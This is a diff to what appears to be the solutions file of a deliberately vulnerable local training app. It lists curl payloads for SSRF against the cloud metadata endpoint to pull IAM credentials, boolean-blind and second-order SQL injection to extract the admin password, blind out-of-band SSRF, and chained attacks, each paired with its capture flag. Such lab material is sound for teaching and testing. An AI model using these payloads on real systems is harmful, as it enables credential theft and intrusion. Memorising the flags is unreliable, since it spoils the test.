@@ -504,3 +504,38 @@ Reaching `169.254.169.254` returns (simulated) IAM credentials:
 curl -s localhost:4060/api/import-avatar -H 'content-type: application/json' \
   -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}'   # FLAG{lj_ssrf_cloud_metadata_creds}
 ```
+
+---
+
+# v8 — multi-actor + blind / second-order
+
+### 60. Boolean-blind SQLi · `GET /api/coupon/check?code=`
+Returns only `valid:true/false`; extract data bit-by-bit:
+```bash
+curl -s "localhost:4060/api/coupon/check?code=x' OR (SELECT substr(password,1,1) FROM users WHERE id=1)='J' -- "
+# valid:true confirms char 1 of the admin password → FLAG{lj_boolean_blind_sqli}
+```
+
+### 61. Second-order SQLi · signup name → `GET /api/admin/report`
+A stored `name` is concatenated into a later query:
+```bash
+curl -s localhost:4060/api/signup -H 'content-type: application/json' \
+  -d '{"email":"a@x.com","password":"x","name":"z'"'"' UNION SELECT email,password FROM users -- "}'
+curl -s localhost:4060/api/admin/report   # payload executes second-order → FLAG{lj_second_order_sqli}
+```
+
+### 62. Blind SSRF (out-of-band) · `POST /api/ping` + `/oob/:token`
+`/api/ping` fetches the URL but returns nothing — confirm via a collaborator beacon:
+```bash
+curl -s localhost:4060/api/ping -H 'content-type: application/json' -d '{"url":"http://localhost:4060/oob/TOKEN"}'
+curl -s localhost:4060/oob/TOKEN/check   # received:true → FLAG{lj_blind_ssrf_oob}
+```
+
+## Chains (v8) — multi-actor
+
+### Chain E — Persistent Payout (Specter + CashOut) · `FLAG{lj_chain_persistent_payout}`
+Register a webhook (persistence, #48) **and** replay a refund (#43); `POST /api/black/persistent-payout` confirms both.
+
+### Chain F — OOB Internal Breach (Composer + Specter) · `FLAG{lj_chain_oob_internal_breach}`
+Confirm a blind SSRF out-of-band (#62), lift the internal token via SSRF (#14), then
+`POST /api/black/oob-breach {token, internal_token}`.
